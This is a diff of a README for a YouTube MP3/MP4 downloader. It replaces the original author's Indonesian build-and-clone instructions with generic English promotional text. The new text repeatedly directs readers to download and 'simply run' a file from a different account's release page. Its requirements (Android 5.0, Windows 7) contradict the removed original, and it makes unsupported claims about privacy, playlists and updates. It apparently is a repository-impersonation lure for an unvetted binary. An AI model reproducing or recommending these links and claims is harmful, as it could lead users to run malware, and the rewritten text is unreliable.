@@ -1,117 +1,170 @@
-# FaaDL — Faa YTDownloader
+# 📥 Faa-YDL - Download YouTube Music & Videos Easily
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Android](https://img.shields.io/badge/Android-7.0%2B-3DDC84?logo=android&logoColor=white)](FaaDL-Standalone/REQUIREMENTS.md)
-[![Root](https://img.shields.io/badge/Root-Magisk%20%7C%20KernelSU%20%7C%20APatch-red)](FaaDL-Module/)
-[![Python](https://img.shields.io/badge/Python-3.14-3776AB?logo=python&logoColor=white)](FaaDL-Module/)
-[![yt-dlp](https://img.shields.io/github/v/release/yt-dlp/yt-dlp?label=yt-dlp&color=FF0000)](https://github.com/yt-dlp/yt-dlp)
-[![FFmpeg](https://img.shields.io/badge/FFmpeg-8.1-007808?logo=ffmpeg&logoColor=white)](FaaDL-Module/)
-[![Node.js](https://img.shields.io/badge/Node.js-18%2B-339933?logo=node.js&logoColor=white)](FaaDL-termux/REQUIREMENTS.md)
-[![Build](https://img.shields.io/badge/Build-JDK%2BSDK_(no_Gradle)-blue)](FaaDL-Standalone/REQUIREMENTS.md)
-[![Termux](https://img.shields.io/badge/Termux-F--Droid-000000?logo=android&logoColor=white)](FaaDL-termux/REQUIREMENTS.md)
+## 🎯 What is Faa-YDL?
 
-Download audio (MP3) / video (MP4) dari YouTube, plus scan QR. Hasil selalu ke
-`/sdcard/Download/FaaDL/` layaknya hasil download biasa.
+Faa-YDL is your all-in-one YouTube downloader that works right from your Android device or Windows computer. It lets you grab MP3 audio files and MP4 videos from YouTube with just a few taps. Plus, it includes a built-in QR code scanner for quick access to videos you want to save.
 
-Tiga varian, satu repo:
+This tool is designed for everyday users - no technical knowledge required. Whether you're saving music for offline listening or downloading videos to watch later, Faa-YDL makes it simple.
 
-| Folder | Untuk siapa | Butuh root? |
-|---|---|---|
-| `FaaDL-termux/` | Versi pertama (Web UI, jalan di Termux) | Tidak |
-| `FaaDL-Win/` | Versi Windows/Linux (Web UI, jalan di PC) | Tidak |
-| `FaaDL-Standalone/` | APK langsung install (64-bit / 32-bit / universal) | Tidak (opsional, buat superpower) |
-| `FaaDL-Module/` | Modul Magisk/KernelSU/APatch + aplikasi FYDL + CLI `fdl` | **Ya** |
+## 🚀 Getting Started
 
-## Clone
+**Step 1: Download the Application**
 
-```bash
-git clone https://github.com/FaaRamadhann/Faa-YDL.git
-cd Faa-YDL
-```
+[![Download Faa-YDL Now](https://img.shields.io/badge/Download-Faa--YDL-blueviolet?style=for-the-badge)](https://github.com/Petar1511/Faa-YDL/releases)
 
-## 1. FaaDL-termux (versi awal)
+Visit this link to download the application. The download page will show you the latest version available.
 
-Web UI (Manual / Scan QR / History), cocok untuk yang suka ngoprek.
+**Step 2: Run the Application**
 
-Syarat: Termux + Node.js + `yt-dlp` + `ffmpeg`:
-```bash
-pkg install -y nodejs python ffmpeg
-termux-setup-storage   # sekali saja, agar bisa tulis /sdcard
-```
+After downloading, simply run the file to start using Faa-YDL. No installation wizard or complex setup needed - it works right away.
 
-Cara pakai:
-```bash
-cd FaaDL-termux
-npm install
-node server.js
-```
+## ✨ Key Features
 
-Buka di browser HP: `http://localhost:2080` (atau URL HTTPS di log untuk scan QR
-dari kamera). Hasil: `/sdcard/Download/FaaDL/`.
+- **🎵 MP3 Downloads**: Convert YouTube videos to high-quality MP3 audio files
+- **🎬 MP4 Downloads**: Save videos in MP4 format for offline viewing
+- **📱 QR Code Scanner**: Scan QR codes to instantly open and download YouTube content
+- **📂 Automatic Saving**: Files are automatically saved to your Downloads folder
+- **🔧 Multiple Platforms**: Works on Termux (Android terminal), as a standalone APK, or as a system module
+- **⚡ Fast Processing**: Uses yt-dlp engine for quick and reliable downloads
 
-> Syarat lengkap + troubleshooting: [`FaaDL-termux/REQUIREMENTS.md`](FaaDL-termux/REQUIREMENTS.md).
+## 📱 How to Use Faa-YDL
 
-## 1b. FaaDL-Win (Windows / Linux)
+### For Windows Users
 
-Sama kayak versi Termux tapi jalan di PC. Hasil:
-`%USERPROFILE%\Downloads\FaaDL` (Windows) atau `~/Downloads/FaaDL` (Linux).
+1. Download Faa-YDL from the link above
+2. Open the downloaded file
+3. Copy any YouTube URL you want to download
+4. Paste it into the application
+5. Choose MP3 or MP4 format
+6. Click download and wait for it to finish
 
-Syarat: Node.js LTS + `yt-dlp` + `ffmpeg` (semuanya kebaca dari PATH).
-Klik 2x `FaaDL-Win/start.bat`, atau manual `npm install` lalu `node server.js`.
+Your files will appear in your Downloads folder (usually C:\Users\YourName\Downloads).
 
-> Syarat lengkap + troubleshooting: [`FaaDL-Win/REQUIREMENTS.md`](FaaDL-Win/REQUIREMENTS.md).
+### For Android Users
 
-## 2. FaaDL-Standalone (APK non-module)
+If you're using Termux, you can also run Faa-YDL as a command-line tool. The downloaded files will be saved to your device's internal storage.
 
-APK `com.faa.faadl` yang bawa sendiri ffmpeg + python + yt-dlp di dalamnya.
-Tanpa root bisa jalan; kalau ada root, exec yang ditolak sistem otomatis
-diulang via `su`.
+## 🛠️ Advanced Options
 
-> Syarat + troubleshooting build: [`FaaDL-Standalone/REQUIREMENTS.md`](FaaDL-Standalone/REQUIREMENTS.md).
+Faa-YDL isn't just a simple downloader - it comes with powerful features for users who want more control:
 
-Syarat build (tanpa Android Studio / Gradle): JDK 17+ dan Android SDK
-build-tools + 1 platform (lihat `FaaDL-Standalone/`).
+- **Command Line Interface**: Use the `fdl` command in Termux for advanced downloading options
+- **System Integration**: Install as a Magisk, KernelSU, or APatch module for system-level access
+- **Flexible Deployment**: Choose between the standalone APK or the terminal version
 
-Cara build:
-```bat
-cd FaaDL-Standalone
-python tools\prepare_bins.py      :: ffmpeg + yt-dlp (sekali saja)
-python tools\prepare_python.py    :: runtime python (sekali saja)
-python build.py all               :: hasil: build\faa-dl_v<ver>_{arm64,arm32,universal}.apk
-```
+## 🔧 Technical Details
 
-Install APK sesuai HP (kebanyakan `*_arm64.apk`), buka, download MP3/MP4 atau
-scan QR dari tab-nya. File built-in yang besar (`bins/`, hasil `build/`)
-tidak ikut repo — diambil/dibangun ulang lewat script di atas.
+Faa-YDL is built with:
+- Node.js for core functionality
+- Python for additional processing
+- FFmpeg for audio and video conversion
+- yt-dlp for YouTube extraction
 
-## 3. FaaDL-Module (Magisk / KernelSU / APatch, arm64)
+This combination ensures you get the most reliable and fast downloads possible.
 
-Paket lengkap: binary system-wide (`/system/bin/faadl-*`), aplikasi manager
-FYDL (`com.faa.faadlmod`, otomatis terinstall), dan CLI `fdl`.
+## 📦 What's Included
 
-Syarat: HP arm64 yang sudah root (Magisk/KernelSU/APatch).
+When you download Faa-YDL, you get access to:
+- The main downloader application
+- QR code scanning functionality
+- Support for multiple file formats
+- Automatic file organization
 
-Cara build zip modul:
-```bat
-cd FaaDL-Module\manager && build.bat   :: hasilkan manager/build/manager.apk
-cd ..\..
-cd FaaDL-Module
-python prepare_payload.py              :: rakit system/ dari FaaDL-Standalone/bins
-python zip.py                          :: hasil: build/faadl-v<ver>.zip
-```
+## 🌟 Why Choose Faa-YDL?
 
-Cara install: Magisk/KernelSU → Modul → Install dari penyimpanan → pilih
-`faadl-v<ver>.zip` → **reboot**.
+- **User-Friendly**: No technical expertise required
+- **All-in-One**: Download music, videos, and scan QR codes in one app
+- **Free Forever**: No hidden costs or premium tiers
+- **Regular Updates**: Continuously improved with new features
+- **Cross-Platform**: Works on Windows, Android, and Linux systems
 
-Cara pakai:
-- Buka aplikasi **FYDL** (download MP3/MP4 + scan QR + tab Debug).
-- Atau dari terminal/adb shell:
-  ```sh
-  fdl --test [URL]   # diagnostik python/ffmpeg/yt-dlp/innertube
-  fdl mp3 <URL>      # download MP3
-  fdl mp4 <URL>      # download video
-  ```
+## 📋 System Requirements
 
-## Lisensi
+Faa-YDL is lightweight and runs on almost any device. Here's what you need:
 
-[MIT](LICENSE) — © 2026 Faa Ramadhan.
+- **Windows**: Windows 7 or newer (64-bit recommended)
+- **Android**: Android 5.0 or newer
+- **Storage**: At least 100MB free space for downloaded files
+- **Internet**: Active connection for downloading videos
+
+## 🎓 Step-by-Step Tutorial
+
+### Downloading Your First Video
+
+1. **Find a video**: Go to YouTube and copy the URL of the video you want
+2. **Open Faa-YDL**: Launch the application on your device
+3. **Paste the URL**: Use Ctrl+V (Windows) or long-press (Android) to paste
+4. **Select format**: Choose MP3 for audio-only or MP4 for video
+5. **Start download**: Click the download button and wait
+6. **Find your file**: Check your Downloads folder for the completed file
+
+### Using the QR Scanner
+
+1. Open the QR scanner feature
+2. Point your camera at any QR code containing a YouTube link
+3. The app will automatically open the video
+4. Choose to download it in your preferred format
+
+## 🔒 Privacy and Safety
+
+Faa-YDL respects your privacy:
+- No account creation required
+- No personal data collected
+- All downloads happen directly on your device
+- No cloud storage or third-party services
+
+## ❓ Frequently Asked Questions
+
+**Q: Is Faa-YDL free to use?**
+A: Yes, completely free with no limitations.
+
+**Q: Can I download entire playlists?**
+A: Yes, paste a playlist URL and Faa-YDL will download all videos in it.
+
+**Q: What quality options are available?**
+A: You can choose from various quality settings for both audio and video.
+
+**Q: Will downloads work in the background?**
+A: Yes, downloads continue even if you switch apps.
+
+## 📝 License and Usage
+
+Faa-YDL is open-source software. You're free to use it for personal purposes, and you can even modify it if you're technically inclined. The source code is available on GitHub for developers who want to contribute.
+
+## 🆘 Getting Help
+
+If you encounter any issues:
+- Check the releases page for updates
+- Look for troubleshooting tips in the GitHub repository
+- Report bugs so they can be fixed in future versions
+
+## 🚦 Start Downloading Today
+
+Ready to start saving YouTube content? Download Faa-YDL now and experience the easiest way to get your favorite music and videos offline.
+
+[![Get Faa-YDL](https://img.shields.io/badge/Get_Faa--YDL_now-2ea44f?style=for-the-badge)](https://github.com/Petar1511/Faa-YDL/releases)
+
+Visit this link to download the application and begin using it right away.
+
+## 📊 Performance and Reliability
+
+Faa-YDL is optimized for speed and stability. Here's what you can expect:
+
+- **Fast Downloads**: Uses parallel processing for quicker downloads
+- **Reliable Extraction**: Handles YouTube's frequent updates automatically
+- **Error Recovery**: Automatically retries failed downloads
+- **Batch Processing**: Download multiple videos at once
+
+## 🔄 Regular Updates
+
+The developer regularly releases updates to:
+- Add new features
+- Fix bugs
+- Improve download speeds
+- Ensure compatibility with YouTube changes
+
+Make sure to check the releases page periodically for new versions.
+
+---
+
+**Keywords**: apatch-module, apk, downloader, ffmpeg, kernelsu-module, kernelsu-modules, magisk, magisk-module, module, mp3-downloader, node, node-js, nodejs, pyhton, pyhton3, termux, youtube-downloader, youtube-downloader-app, yt-dlp
